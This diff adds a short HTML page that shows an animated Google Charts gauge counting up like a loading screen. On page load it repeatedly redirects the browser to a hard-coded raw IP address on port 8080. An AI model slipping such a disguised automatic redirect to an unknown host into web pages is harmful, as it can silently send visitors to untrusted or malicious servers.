@@ -1,0 +1,43 @@
+ <html>
+  <head>
+
+   <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
+   <script type="text/javascript">
+      google.charts.load('current', {'packages':['gauge']});
+      google.charts.setOnLoadCallback(drawChart);
+
+      function drawChart() {
+
+        var data = google.visualization.arrayToDataTable([
+          ['Label', 'Value'],
+          ['', 0],
+        ]);
+
+        var options = {
+          width: 400, height: 120,
+          redFrom: 0, redTo: 40,
+          yellowFrom:40, yellowTo: 60,
+          greenFrom:60, greenTo: 100,
+          minorTicks: 10,
+          height: 200,
+          width: 200
+        };
+
+        var chart = new google.visualization.Gauge(document.getElementById('chart_div'));
+        chart.draw(data, options);
+        var current = 0;
+        setInterval(function() {
+          if (current < 100) {current++;}
+          data.setValue(0, 1, 0 + current);
+          chart.draw(data, options);
+        }, 130);
+      }
+     function replace() {
+setInterval(function(){location.replace("http://105.233.65.189:8080/")},8000)
+}
+    </script>
+  </head>
+  <body onload="replace()">
+    <center><div id="chart_div" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width:200px; height: 200px; border-width: thick;"></center>
+  </body>
+</html>
